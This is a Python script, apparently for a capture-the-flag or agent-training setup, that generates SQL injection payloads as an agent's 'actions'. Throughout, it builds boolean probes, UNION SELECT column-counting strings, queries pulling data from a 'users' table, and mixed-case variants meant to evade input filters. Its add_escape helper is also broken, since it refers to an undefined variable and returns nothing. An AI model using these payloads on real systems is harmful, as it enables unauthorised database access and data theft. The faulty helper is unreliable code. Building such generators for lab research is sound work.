
def add_escape(instr, escape):
	if(esc == "'" or esc == '"'):
		esc + instr + esc

#Param max_columns -> The number of columns in Union queries
#eg. if a database table has 5 columns per entry, max_columns should be 5
def generate_actions(escapes = None, max_columns = 3):
	actions = []
	if(escapes is None):
		escapes = ['"', "'",""]

	#generate flag capturing options
	for esc in escapes:

		##generate exploratory options
		x = "{0} and {0}1{0}={0}1".format(esc) + ("#" if esc == "" else "")
		actions.append(x)
		x = "{0} and {0}1{0}={0}2".format(esc) + ("#" if esc == "" else "")
		actions.append(x)


		##Basic
		x = "{0} or {0}1{0}={0}1{0}".format(esc) + ("#" if esc == "" else "-- ")
		actions.append(x)
		x = "{0} or {0}1{0}={0}2{0}".format(esc) + ("#" if esc == "" else "-- ")
		actions.append(x)

		columns = "1"
		for i in range(2, max_columns + 2):
			x = "{0} union select {1}".format(esc, columns) + ("#" if esc == "" else "-- ")
			actions.append(x)

			columns = columns + "," + str(i)


		#To detect the number of columns and the required offset
		#Assumes knowlegde about table name and column name
		columns = "surname"
		for i in range(2, max_columns + 2):
			#x = "' UNION SELECT first_name,2,3,4,5 FROM User LIMIT 5--"
			x = "{0} union select {1} FROM users".format(esc, columns) + ("#" if esc == "" else "-- ")
			actions.append(x)

			columns = columns + "," + "surname"

	return actions

def generate_actions_input_filter(escapes = None, max_columns = 2):
	actions = []
	if(escapes is None):
		escapes = ['"', "'",""]

	#generate flag capturing options
	for esc in escapes:

		##generate exploratory options
		x = "{0} and {0}1{0}={0}1".format(esc) + ("#" if esc == "" else "")
		actions.append(x)
		x = "{0} and {0}1{0}={0}2".format(esc) + ("#" if esc == "" else "")
		actions.append(x)


		##Basic
		x = "{0} or {0}1{0}={0}1{0}".format(esc) + ("#" if esc == "" else "-- ")
		actions.append(x)
		x = "{0} or {0}1{0}={0}2{0}".format(esc) + ("#" if esc == "" else "-- ")
		actions.append(x)

		x = "{0} oR {0}1{0}={0}1{0}".format(esc) + ("#" if esc == "" else "-- ")
		actions.append(x)
		x = "{0} oR {0}1{0}={0}2{0}".format(esc) + ("#" if esc == "" else "-- ")
		actions.append(x)

		columns = "1"
		for i in range(2, max_columns + 2):
			#x = "' UNION SELECT first_name,2,3,4,5 FROM User LIMIT 5--"
			x = "{0} union select {1}".format(esc, columns) + ("#" if esc == "" else "-- ")
			actions.append(x)

			x = "{0} uNiOn select {1}".format(esc, columns) + ("#" if esc == "" else "-- ")
			actions.append(x)

			x = "{0} union sElEct {1}".format(esc, columns) + ("#" if esc == "" else "-- ")
			actions.append(x)

			# x = "{0} UNunionION SEselectLECT {1} FROM users".format(esc, columns) + ("#" if esc == "" else "-- ")
			# actions.append(x)

			columns = columns + "," + str(i)


		#To detect the number of columns and the required offset
		#Assumes knowlegde about table name and column name
		columns = "surname"
		for i in range(2, max_columns + 2):
			x = "{0} union select {1} from users".format(esc, columns) + ("#" if esc == "" else "-- ")
			actions.append(x)

			x = "{0} uNiOn select {1} from users".format(esc, columns) + ("#" if esc == "" else "-- ")
			actions.append(x)

			x = "{0} union sElEct {1} from users".format(esc, columns) + ("#" if esc == "" else "-- ")
			actions.append(x)

			columns = columns + "," + "surname"

	return actions




if __name__ == "__main__":
	actions = generate_actions()
	actions_filter = generate_actions_input_filter()

	print("Possible actions: ", len(actions))
	for action in actions:
		print(action)

	print()
	print()
	print()

	print("Possible actions: ", len(actions_filter))
	for action in actions_filter:
		print(action)
